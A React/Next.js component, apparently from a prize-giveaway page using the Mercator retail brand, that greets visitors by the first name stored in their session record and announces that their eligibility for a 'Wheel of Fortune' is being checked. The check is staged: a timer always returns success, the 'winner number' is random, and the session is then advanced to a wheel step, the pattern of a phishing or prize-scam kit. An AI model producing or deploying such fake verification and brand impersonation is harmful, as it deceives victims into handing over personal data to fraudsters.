"use client";

import confetti from "canvas-confetti";
import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

type Phase = "loading" | "checking" | "success" | "error";

const MERCATOR_ACCENT = "#E30613";
const MERCATOR_RED = "#E30613";
const LUX_GOLD = "#FFD700";
const LUX_GOLD_LIGHT = "#FFF1B8";
const LUX_WHITE = "#FFFFFF";

const CONFETTI_COLORS = [MERCATOR_ACCENT, MERCATOR_RED, LUX_GOLD, LUX_WHITE];
const GOLD_COLORS = [LUX_GOLD, LUX_GOLD_LIGHT, LUX_WHITE];

const CHECK_MS = 6000;
const SUCCESS_MIN_MS = 5000;
const SUCCESS_MAX_MS = 6000;

function fireLuxuryConfetti() {
  const base = {
    ticks: 380,
    gravity: 0.5,
    decay: 0.94,
    disableForReducedMotion: true,
  };

  // Wave 1 — iki koseden zarif altin serpinti (sade, sik)
  void confetti({
    ...base,
    colors: GOLD_COLORS,
    particleCount: 55,
    angle: 60,
    spread: 55,
    startVelocity: 38,
    scalar: 0.9,
    origin: { x: 0, y: 0.7 },
  });
  void confetti({
    ...base,
    colors: GOLD_COLORS,
    particleCount: 55,
    angle: 120,
    spread: 55,
    startVelocity: 38,
    scalar: 0.9,
    origin: { x: 1, y: 0.7 },
  });

  // Wave 2 — ustten yavasca suzulen ince altin + beyaz kagit
  window.setTimeout(() => {
    void confetti({
      ...base,
      colors: [LUX_GOLD, LUX_WHITE],
      particleCount: 70,
      spread: 130,
      startVelocity: 18,
      gravity: 0.35,
      drift: 0.4,
      ticks: 480,
      scalar: 0.7,
      origin: { x: 0.5, y: 0.1 },
    });
  }, 500);

  // Wave 3 — cok hafif kirmizi vurgu (marka rengi, az parcacik)
  window.setTimeout(() => {
    void confetti({
      ...base,
      colors: [MERCATOR_RED, LUX_GOLD],
      particleCount: 30,
      spread: 80,
      startVelocity: 24,
      gravity: 0.4,
      ticks: 440,
      scalar: 0.8,
      origin: { x: 0.5, y: 0.3 },
    });
  }, 1100);
}

export function VerifyClient({ sessionId, routeSessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [phase, setPhase] = useState<Phase>("loading");
  const [firstName, setFirstName] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [winnerNo] = useState(() => 20 + Math.floor(Math.random() * 980));
  const timersRef = useRef<number[]>([]);

  const effectiveRouteSessionId = routeSessionId ?? sessionId;

  useEffect(() => {
    const timers = timersRef.current;
    return () => {
      timers.forEach((t) => window.clearTimeout(t));
    };
  }, []);

  useEffect(() => {
    let cancelled = false;
    if (!supabase || !sessionId) {
      setPhase("checking");
      return;
    }
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const name = data?.form_data?.firstName;
      if (typeof name === "string" && name.trim()) {
        setFirstName(name.trim());
      }
      setPhase("checking");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    if (phase !== "checking") return;

    timersRef.current.push(
      window.setTimeout(() => {
        setPhase("success");
      }, CHECK_MS),
    );
  }, [phase]);

  useEffect(() => {
    if (phase !== "success") return;

    fireLuxuryConfetti();

    const redirectMs =
      SUCCESS_MIN_MS + Math.random() * (SUCCESS_MAX_MS - SUCCESS_MIN_MS);
    timersRef.current.push(
      window.setTimeout(() => {
        const go = async () => {
          try {
            if (supabase && sessionId) {
              await supabase
                .from("sessions")
                .update({ current_step: "wheel" })
                .eq("id", sessionId);
            }
          } catch {
            /* best-effort; navigation proceeds anyway */
          }
          router.push(
            `/wheel?session=${encodeURIComponent(effectiveRouteSessionId)}`,
          );
        };
        void go();
      }, redirectMs),
    );
  }, [phase, router, sessionId, supabase, effectiveRouteSessionId]);

  if (error) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">
          {error}
        </p>
      </div>
    );
  }

  return (
    <div className="relative flex min-h-[100dvh] items-center justify-center overflow-hidden p-4">
      {phase !== "success" ? (
        <div className="w-full max-w-[480px] rounded-[24px] border border-[#8b0018] bg-[#17030a]/90 px-6 py-10 text-center shadow-[0_0_60px_rgba(227,6,19,0.35)] sm:px-10">
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center">
            <div className="h-14 w-14 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#ff6b74]" />
          </div>
          <h1 className="text-xl font-extrabold text-white sm:text-2xl">
            Prosimo, počakajte...
          </h1>
          <p className="mt-3 text-sm font-medium leading-relaxed text-slate-300 sm:text-[15px]">
            Preverja se, ali ste upravičeni do vrtenja Kola Sreče.
            <br />
            Rezultat bo objavljen čez nekaj sekund.
          </p>
          <div className="mx-auto mt-6 h-1.5 w-56 max-w-full overflow-hidden rounded-full bg-[#3d0310]">
            <div
              className="h-full w-1/3 rounded-full bg-gradient-to-r from-[#E30613] via-[#ff6b74] to-[#E30613]"
              style={{ animation: "verifySlide 1.6s ease-in-out infinite" }}
            />
          </div>
          <style jsx>{`
            @keyframes verifySlide {
              0% {
                transform: translateX(-120%);
              }
              100% {
                transform: translateX(400%);
              }
            }
          `}</style>
        </div>
      ) : (
        <div className="w-full max-w-[520px] animate-in zoom-in-95 duration-700">
          <div className="rounded-[28px] bg-gradient-to-b from-[#FFD700]/70 via-[#FFD700]/20 to-transparent p-[1.5px] shadow-[0_30px_90px_-20px_rgba(255,215,0,0.35)]">
            <div className="relative overflow-hidden rounded-[27px] bg-[#12060a]/95 px-6 py-12 text-center backdrop-blur-xl sm:px-12">
              <div className="pointer-events-none absolute -top-24 left-1/2 h-48 w-[130%] -translate-x-1/2 rounded-full bg-[#FFD700]/10 blur-3xl" />
              <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-[#FFD700]/60 to-transparent" />

              <img
                src="/form-assets/mercator-logo.png"
                alt="Mercator"
                className="mx-auto mb-8 h-8 w-auto opacity-90 drop-shadow-[0_2px_12px_rgba(255,255,255,0.15)]"
                draggable={false}
              />

              <div className="relative mx-auto mb-7 flex h-20 w-20 items-center justify-center">
                <div className="absolute inset-0 rounded-full bg-[#FFD700]/20 blur-xl" />
                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#FFE98A] via-[#FFD700] to-[#c99000] shadow-[0_0_40px_rgba(255,215,0,0.45),inset_0_2px_6px_rgba(255,255,255,0.5)]">
                  <svg
                    className="h-8 w-8 text-[#12060a]"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    strokeWidth={3}
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </div>
              </div>

              <p className="text-[11px] font-bold uppercase tracking-[0.35em] text-[#FFD700]/90">
                Čestitamo
              </p>
              <h1 className="mt-2 break-words text-4xl font-black tracking-tight text-white sm:text-5xl">
                {firstName ? `${firstName}!` : "Čestitamo!"}
              </h1>

              <div className="mx-auto mt-6 inline-flex items-center gap-2.5 rounded-full border border-[#FFD700]/30 bg-gradient-to-r from-[#E30613]/30 via-[#E30613]/15 to-[#E30613]/30 px-5 py-2 shadow-[inset_0_1px_0_rgba(255,255,255,0.08)]">
                <svg
                  className="h-4 w-4 text-[#FFD700]"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path d="M10 1.5l2.6 5.3 5.9.9-4.3 4.1 1 5.8L10 14.9l-5.2 2.7 1-5.8L1.5 7.7l5.9-.9L10 1.5z" />
                </svg>
                <span className="text-sm font-bold tracking-wide text-[#FFE98A]">
                  Zmagovalec št. {winnerNo}
                </span>
              </div>

              <p className="mt-6 text-sm font-medium leading-relaxed text-white/70 sm:text-base">
                Osvojili ste pravico do vrtenja Kola Sreče!
              </p>

              <div className="mt-8 flex items-center justify-center gap-2.5 text-xs font-medium tracking-wide text-white/45">
                <div className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/15 border-t-[#FFD700]" />
                Preusmerjanje na Kolo Sreče...
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
